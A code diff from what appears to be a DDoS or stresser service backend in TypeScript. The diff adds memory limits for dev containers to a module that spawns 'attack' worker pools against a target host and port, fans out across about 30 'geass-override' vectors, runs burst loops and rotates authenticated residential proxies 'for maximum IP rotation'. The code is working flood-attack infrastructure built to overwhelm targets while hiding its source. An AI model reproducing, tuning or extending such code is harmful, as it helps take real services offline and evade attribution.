@@ -129,14 +129,22 @@ setInterval(() => {
 const CPU_COUNT = Math.max(1, os.cpus().length);
 
 // ── OOM Guard — cap workers per pool in dev to prevent container kill ──────
-// Replit dev containers: ~2GB RAM shared. Each worker_thread = ~60-80MB baseline.
-// 33 geass-override pools × 8 workers × 60MB = 15GB peak → instant OOM kill.
+// Replit dev containers: ~2GB RAM shared.
 // DETECTION: REPLIT_DEPLOYMENT is set ONLY in deployed (production) containers.
-//            In dev workspaces it is absent regardless of NODE_ENV.
-// In deployed: REPLIT_DEPLOYMENT=1 → no cap (dedicated resources, full power).
-// In dev:      absent → cap at 1 worker/pool → 33 workers × 60MB = ~2GB max.
+// In deployed: REPLIT_DEPLOYMENT=1 → no cap, full power (8-32GB dedicated).
+// In dev:      absent → strict caps to keep container alive.
 const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
 const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 999 : 1;
+
+// Dev: clamp in-worker thread concurrency so each worker opens fewer sockets.
+// Deployed: uncapped — the workers' async I/O is the bottleneck, not RAM.
+const DEV_MAX_THREADS = 64;
+
+// Dev: limit total concurrent worker_threads across ALL attack pools.
+// 14 workers × 48MB heap = ~672MB peak — safe for 2GB containers.
+// Deployed: no limit.
+let _activeWorkers = 0;
+const MAX_TOTAL_WORKERS_DEV = IS_DEPLOYED ? Infinity : 14;
 
 // ── Webhook ────────────────────────────────────────────────────────────────
 async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
@@ -347,13 +355,24 @@ function spawnPool(
   numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
   onCodes?: (codes: LiveCodes, latAvgMs: number) => void,
 ): Promise<void> {
-  // Apply OOM guard — cap workers in dev to prevent container kill
+  // OOM Guard 1: cap workers per pool
   numWorkers = Math.min(numWorkers, MAX_WORKERS_PER_POOL);
+
+  // OOM Guard 2: global total worker cap in dev
+  if (!IS_DEPLOYED && _activeWorkers >= MAX_TOTAL_WORKERS_DEV) {
+    // Skip this pool — too many workers already running
+    return Promise.resolve();
+  }
+
+  // OOM Guard 3: clamp threads per worker in dev to limit in-flight socket count
+  if (!IS_DEPLOYED) {
+    threads = Math.min(threads, DEV_MAX_THREADS);
+  }
+
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
   const workerConns = new Array<number>(numWorkers).fill(0);
   // Pass ALL fastest proxies (HTTP + SOCKS5) to workers for maximum IP rotation
-  // CRITICAL: include username/password so authenticated proxies (residential) work in workers
   const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
     ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined, username: p.username, password: p.password }))
     : [];
@@ -361,31 +380,40 @@ function spawnPool(
   return new Promise<void>((resolve) => {
     const finished = new Set<number>();
     let resolved = false;
-    const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };
+    const tryResolve = () => {
+      if (!resolved && finished.size >= numWorkers) {
+        resolved = true;
+        _activeWorkers = Math.max(0, _activeWorkers - numWorkers);
+        resolve();
+      }
+    };
 
     for (let i = 0; i < numWorkers; i++) {
+      // Re-check global cap for each worker (burst mode can push us over)
+      if (!IS_DEPLOYED && _activeWorkers >= MAX_TOTAL_WORKERS_DEV) {
+        finished.add(i);
+        tryResolve();
+        continue;
+      }
+
       const t = i === numWorkers - 1
         ? threads - threadsPerWorker * (numWorkers - 1)
         : threadsPerWorker;
 
-      // Heap cap per worker isolate.
-      // Deployed (REPLIT_DEPLOYMENT=1, 32GB RAM): 1024MB → full power for dedicated containers.
-      //   Total: 33 pools × 8 workers × 1GB = 264GB — Replit limits this correctly via OOM.
-      //   In practice workers rarely use full heap; 1GB ceiling prevents premature eviction.
-      // Dev workspace: 64MB → 33 pools × 64MB = ~2GB max, keeps API server alive.
-      // NOTE: do NOT use NODE_ENV — dev script sets NODE_ENV=production.
+      // Heap cap per worker:
+      // Deployed (8-32GB RAM): 1024MB → full power, workers rarely hit this ceiling.
+      // Dev (2GB total):       48MB  → 14 workers × 48 = 672MB max, safe.
       const workerOpts: import("worker_threads").WorkerOptions = {
         workerData: { method, target, port, threads: t, proxies },
-        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 256 },
+        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 48 },
       };
       const w = new Worker(WORKER_FILE, workerOpts);
+      _activeWorkers++;
       const idx = i;
       workers.push(w);
 
       w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number; codes?: LiveCodes; latAvgMs?: number }) => {
         if (msg.codes) {
-          // T003: dispatch via global registry (keyed by AbortSignal) — avoids threading
-          // onCodes through every spawnPool call in the 30-vector geass-override fanout.
           const dispatch = onCodes ?? _codeDispatchers.get(signal);
           dispatch?.(msg.codes, msg.latAvgMs ?? 0);
         }
@@ -404,7 +432,7 @@ function spawnPool(
       workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
       setTimeout(() => {
         workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
-        if (!resolved) { resolved = true; resolve(); }
+        if (!resolved) { resolved = true; _activeWorkers = Math.max(0, _activeWorkers - numWorkers); resolve(); }
       }, 2000);
     }, { once: true });
   });
@@ -704,12 +732,13 @@ async function runAttackWorkers(
         await new Promise<void>(r => setTimeout(r, restMs));
       }
     };
-    void burstLoop();
+    // Burst mode: deployed only — in dev, extra workers would cause OOM
+    if (IS_DEPLOYED) void burstLoop();
     await geassPromise;
     return;
   }
 
-  // All other real-network methods: single pool of CPU_COUNT workers
+  // All other real-network methods: single pool of CPU_COUNT workers (1 in dev)
   await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
 }
 
